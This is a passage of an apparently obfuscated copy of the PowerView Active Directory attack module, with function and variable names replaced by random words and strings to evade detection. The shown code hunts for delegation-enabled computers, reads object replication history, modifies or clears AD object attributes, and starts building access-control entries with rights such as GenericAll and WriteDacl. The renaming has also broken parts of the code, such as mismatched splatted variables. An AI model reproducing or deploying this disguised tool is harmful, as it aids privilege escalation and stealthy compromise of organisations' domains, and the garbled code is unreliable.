        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $ObrKztQN99 = breading @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            rapscallions -eDOaPEtH99 -MIeirkyG99 $PSBoundParameters
        }
        if ($ObrKztQN99) {
            $waAVGUFD99 = ''
            $nQZyhrEp99 = ''
            $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($MFlrbkhb99 -match '^S-1-') {
                    $waAVGUFD99 += "(objectsid=$MFlrbkhb99)"
                }
                elseif ($MFlrbkhb99 -match '^CN=') {
                    $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[boozed] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                        $zLdPCUTB99['Domain'] = $cIRoWbek99
                        $ObrKztQN99 = breading @SearcherArguments
                        if (-not $ObrKztQN99) {
                            Write-Warning "[boozed] Unable to retrieve domain searcher for '$cIRoWbek99'"
                        }
                    }
                }
                elseif ($MFlrbkhb99.Contains('.')) {
                    $waAVGUFD99 += "(|(name=$MFlrbkhb99)(dnshostname=$MFlrbkhb99))"
                }
                elseif ($MFlrbkhb99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $yhPDRNjn99 = (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                }
                else {
                    $waAVGUFD99 += "(name=$MFlrbkhb99)"
                }
            }
            if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                $nQZyhrEp99 += "(|$waAVGUFD99)"
            }
            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[boozed] Searching for computers with for unconstrained delegation'
                $nQZyhrEp99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[boozed] Searching for computers that are trusted to authenticate for other principals'
                $nQZyhrEp99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[boozed] Searching for printers'
                $nQZyhrEp99 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[boozed] Searching for computers with SPN: $SPN"
                $nQZyhrEp99 += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[boozed] Searching for computers with operating system: $cHJdXVHn99"
                $nQZyhrEp99 += "(operatingsystem=$cHJdXVHn99)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[boozed] Searching for computers with service pack: $kVBIYPdx99"
                $nQZyhrEp99 += "(operatingsystemservicepack=$kVBIYPdx99)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[boozed] Searching for computers with site name: $TQljdANP99"
                $nQZyhrEp99 += "(serverreferencebl=$TQljdANP99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[boozed] Using additional LDAP filter: $gzpPmKdI99"
                $nQZyhrEp99 += "$gzpPmKdI99"
            }
            $UkudTRIT99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $YNcsOqMv99 = $_.Substring(4)
                    $VPkznDAA99 = [Int]($tGlaulwz99::$YNcsOqMv99)
                    $nQZyhrEp99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$VPkznDAA99))"
                }
                else {
                    $VPkznDAA99 = [Int]($tGlaulwz99::$_)
                    $nQZyhrEp99 += "(userAccountControl:1.2.840.113556.1.4.803:=$VPkznDAA99)"
                }
            }
            $ObrKztQN99.filter = "(&(samAccountType=805306369)$nQZyhrEp99)"
            Write-Verbose "[boozed] boozed filter string: $($ObrKztQN99.filter)"
            if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $ObrKztQN99.FindOne() }
            else { $NtqBcYnO99 = $ObrKztQN99.FindAll() }
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -kyzUdCPm99 $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        $GucPfsvo99 = $_
                        $GucPfsvo99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $GucPfsvo99 = decaffeinating -PvRupVWt99 $_.Properties
                        $GucPfsvo99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $GucPfsvo99
                }
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[boozed] Error disposing of the Results object: $_"
                }
            }
            $ObrKztQN99.dispose()
        }
    }
}
function cupped {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $NcvNWdqy99 = [Enum]::GetNames($tGlaulwz99)
        $NcvNWdqy99 = $NcvNWdqy99 | ForEach-Object {$_; "NOT_$_"}
        rapscallions -Name UACFilter -zFsLSBhf99 $NcvNWdqy99 -Type ([array])
    }
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $eCbXoWON99 = breading @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            rapscallions -eDOaPEtH99 -MIeirkyG99 $PSBoundParameters
        }
        if ($eCbXoWON99) {
            $waAVGUFD99 = ''
            $nQZyhrEp99 = ''
            $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($MFlrbkhb99 -match '^S-1-') {
                    $waAVGUFD99 += "(objectsid=$MFlrbkhb99)"
                }
                elseif ($MFlrbkhb99 -match '^(CN|OU|DC)=') {
                    $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[cupped] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                        $zLdPCUTB99['Domain'] = $cIRoWbek99
                        $eCbXoWON99 = breading @SearcherArguments
                        if (-not $eCbXoWON99) {
                            Write-Warning "[cupped] Unable to retrieve domain searcher for '$cIRoWbek99'"
                        }
                    }
                }
                elseif ($MFlrbkhb99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $yhPDRNjn99 = (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                }
                elseif ($MFlrbkhb99.Contains('\')) {
                    $IPeanipX99 = $MFlrbkhb99.Replace('\28', '(').Replace('\29', ')') | intrenches -vxxrLejt99 Canonical
                    if ($IPeanipX99) {
                        $NnLAVZyX99 = $IPeanipX99.SubString(0, $IPeanipX99.IndexOf('/'))
                        $tFiqSWVt99 = $MFlrbkhb99.Split('\')[1]
                        $waAVGUFD99 += "(samAccountName=$tFiqSWVt99)"
                        $zLdPCUTB99['Domain'] = $NnLAVZyX99
                        Write-Verbose "[cupped] Extracted domain '$NnLAVZyX99' from '$MFlrbkhb99'"
                        $eCbXoWON99 = breading @SearcherArguments
                    }
                }
                elseif ($MFlrbkhb99.Contains('.')) {
                    $waAVGUFD99 += "(|(samAccountName=$MFlrbkhb99)(name=$MFlrbkhb99)(dnshostname=$MFlrbkhb99))"
                }
                else {
                    $waAVGUFD99 += "(|(samAccountName=$MFlrbkhb99)(name=$MFlrbkhb99)(displayname=$MFlrbkhb99))"
                }
            }
            if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                $nQZyhrEp99 += "(|$waAVGUFD99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[cupped] Using additional LDAP filter: $gzpPmKdI99"
                $nQZyhrEp99 += "$gzpPmKdI99"
            }
            $UkudTRIT99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $YNcsOqMv99 = $_.Substring(4)
                    $VPkznDAA99 = [Int]($tGlaulwz99::$YNcsOqMv99)
                    $nQZyhrEp99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$VPkznDAA99))"
                }
                else {
                    $VPkznDAA99 = [Int]($tGlaulwz99::$_)
                    $nQZyhrEp99 += "(userAccountControl:1.2.840.113556.1.4.803:=$VPkznDAA99)"
                }
            }
            if ($nQZyhrEp99 -and $nQZyhrEp99 -ne '') {
                $eCbXoWON99.filter = "(&$nQZyhrEp99)"
            }
            Write-Verbose "[cupped] cupped filter string: $($eCbXoWON99.filter)"
            if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $eCbXoWON99.FindOne() }
            else { $NtqBcYnO99 = $eCbXoWON99.FindAll() }
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = decaffeinating -PvRupVWt99 $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[cupped] Error disposing of the Results object: $_"
                }
            }
            $eCbXoWON99.dispose()
        }
    }
}
function beached {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $zLdPCUTB99 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $zLdPCUTB99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['FindOne']) { $zLdPCUTB99['FindOne'] = $fnsssdap99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['Properties']) {
            $ylWlrZaq99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $ylWlrZaq99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $zLdPCUTB99['Identity'] = $fqOhNdkk99 }
        cupped @SearcherArguments | ForEach-Object {
            $azPUroAG99 = $_.Properties['distinguishedname'][0]
            ForEach($FErQptwd99 in $_.Properties['msds-replattributemetadata']) {
                $dqzScCJu99 = [xml]$FErQptwd99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($dqzScCJu99) {
                    if ($dqzScCJu99.pszAttributeName -Match $ylWlrZaq99) {
                        $wzSptcsg99 = New-Object PSObject
                        $wzSptcsg99 | Add-Member NoteProperty 'ObjectDN' $azPUroAG99
                        $wzSptcsg99 | Add-Member NoteProperty 'AttributeName' $dqzScCJu99.pszAttributeName
                        $wzSptcsg99 | Add-Member NoteProperty 'LastOriginatingChange' $dqzScCJu99.ftimeLastOriginatingChange
                        $wzSptcsg99 | Add-Member NoteProperty 'Version' $dqzScCJu99.dwVersion
                        $wzSptcsg99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $dqzScCJu99.pszLastOriginatingDsaDN
                        $wzSptcsg99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $wzSptcsg99
                    }
                }
                else {
                    Write-Verbose "[beached] Error retrieving 'msds-replattributemetadata' for '$azPUroAG99'"
                }
            }
        }
    }
}
function dumbbell {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $zLdPCUTB99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $zLdPCUTB99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['Properties']) {
            $ylWlrZaq99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $ylWlrZaq99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $zLdPCUTB99['Identity'] = $fqOhNdkk99 }
        cupped @SearcherArguments | ForEach-Object {
            $azPUroAG99 = $_.Properties['distinguishedname'][0]
            ForEach($FErQptwd99 in $_.Properties['msds-replvaluemetadata']) {
                $dqzScCJu99 = [xml]$FErQptwd99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($dqzScCJu99) {
                    if ($dqzScCJu99.pszAttributeName -Match $ylWlrZaq99) {
                        $wzSptcsg99 = New-Object PSObject
                        $wzSptcsg99 | Add-Member NoteProperty 'ObjectDN' $azPUroAG99
                        $wzSptcsg99 | Add-Member NoteProperty 'AttributeName' $dqzScCJu99.pszAttributeName
                        $wzSptcsg99 | Add-Member NoteProperty 'AttributeValue' $dqzScCJu99.pszObjectDn
                        $wzSptcsg99 | Add-Member NoteProperty 'TimeCreated' $dqzScCJu99.ftimeCreated
                        $wzSptcsg99 | Add-Member NoteProperty 'TimeDeleted' $dqzScCJu99.ftimeDeleted
                        $wzSptcsg99 | Add-Member NoteProperty 'LastOriginatingChange' $dqzScCJu99.ftimeLastOriginatingChange
                        $wzSptcsg99 | Add-Member NoteProperty 'Version' $dqzScCJu99.dwVersion
                        $wzSptcsg99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $dqzScCJu99.pszLastOriginatingDsaDN
                        $wzSptcsg99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $wzSptcsg99
                    }
                }
                else {
                    Write-Verbose "[dumbbell] Error retrieving 'msds-replvaluemetadata' for '$azPUroAG99'"
                }
            }
        }
    }
}
function airway {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $zLdPCUTB99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $zLdPCUTB99['Identity'] = $fqOhNdkk99 }
        $rQJIZokN99 = cupped @SearcherArguments
        ForEach ($Object in $rQJIZokN99) {
            $Entry = $rQJIZokN99.GetDirectoryEntry()
            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[airway] Setting '$($_.Name)' to '$($_.Value)' for object '$($rQJIZokN99.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[airway] Error setting/replacing properties for object '$($rQJIZokN99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $hTIqreui99 = $_.Name
                        $fDiEemCA99 = $_.Value
                        Write-Verbose "[airway] XORing '$hTIqreui99' with '$fDiEemCA99' for object '$($rQJIZokN99.Properties.samaccountname)'"
                        $YwFZjtQZ99 = $Entry.$hTIqreui99[0].GetType().name
                        $BPuHbwKo99 = $($Entry.$hTIqreui99) -bxor $fDiEemCA99
                        $Entry.$hTIqreui99 = $BPuHbwKo99 -as $YwFZjtQZ99
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[airway] Error XOR'ing properties for object '$($rQJIZokN99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $hTIqreui99 = $_
                        Write-Verbose "[airway] Clearing '$hTIqreui99' for object '$($rQJIZokN99.Properties.samaccountname)'"
                        $Entry.$hTIqreui99.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[airway] Error clearing properties for object '$($rQJIZokN99.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function containment {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $YTzMpfCb99
    )
    Begin {
        if($YTzMpfCb99.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }
        function hostels {
            Param (
                [int[]]
                $fWQtLLHW99
            )
            $sTECBBfE99 = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $fWQtLLHW99[$i]
                $FXdWquQC99 = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
                $sTECBBfE99[$FXdWquQC99+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $sTECBBfE99[$FXdWquQC99+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $sTECBBfE99[$FXdWquQC99+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $sTECBBfE99[$FXdWquQC99+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $sTECBBfE99[$FXdWquQC99+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $sTECBBfE99[$FXdWquQC99+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $sTECBBfE99[$FXdWquQC99+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $sTECBBfE99[$FXdWquQC99+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }
            $sTECBBfE99
        }
    }
    Process {
        $wzSptcsg99 = @{
            Sunday = hostels -fWQtLLHW99 $YTzMpfCb99[0..2]
            Monday = hostels -fWQtLLHW99 $YTzMpfCb99[3..5]
            Tuesday = hostels -fWQtLLHW99 $YTzMpfCb99[6..8]
            Wednesday = hostels -fWQtLLHW99 $YTzMpfCb99[9..11]
            Thurs = hostels -fWQtLLHW99 $YTzMpfCb99[12..14]
            Friday = hostels -fWQtLLHW99 $YTzMpfCb99[15..17]
            Saturday = hostels -fWQtLLHW99 $YTzMpfCb99[18..20]
        }
        $wzSptcsg99 = New-Object PSObject -Property $wzSptcsg99
        $wzSptcsg99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $wzSptcsg99
    }
}
function threw {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $YbgFSwLK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $YMcEuqkF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $izzwHBDO99,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $CWZFxPIE99,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
